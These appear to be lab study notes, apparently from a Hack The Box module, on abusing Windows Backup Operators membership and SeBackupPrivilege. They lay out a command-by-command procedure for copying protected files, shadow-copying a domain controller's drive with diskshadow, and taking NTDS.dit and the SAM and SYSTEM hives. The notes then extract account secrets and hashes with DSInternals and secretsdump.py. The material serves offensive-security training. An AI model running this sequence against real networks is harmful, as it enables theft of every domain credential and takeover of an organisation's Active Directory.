## Backup Operators
#### Importing Libraries

```powershell
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll 
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```
#### Verifying SeBackupPrivilege is Enabled

```powershell
PS C:\htb> whoami /priv
```
#### Enabling SeBackupPrivilege

```powershell
PS C:\htb> Set-SeBackupPrivilege 
PS C:\htb> Get-SeBackupPrivilege 

SeBackupPrivilege is enabled
```

```powershell
PS C:\htb> whoami /priv
```
#### Copying a Protected File

```powershell
PS C:\htb> dir C:\Confidential\

PS C:\htb> cat 'C:\Confidential\2021 Contract.txt.txt'
```

```powershell
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt.txt' .\Contract.txt

PS C:\htb> cat .\Contract.txt
```
#### Attacking a Domain Controller - Copying NTDS.dit

As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.

```powershell
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```
#### Copying NTDS.dit Locally

```powershell
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
#### Backing up SAM and SYSTEM Registry Hives

```powershell
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```
#### Extracting Credentials from NTDS.dit

```powershell
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```
#### Extracting Hashes Using SecretsDump

```shell
3kjS@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
## Robocopy
#### Copying Files with Robocopy

```cmd
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```
![](Screenshot%202026-08-19%20at%2008.55.18.png)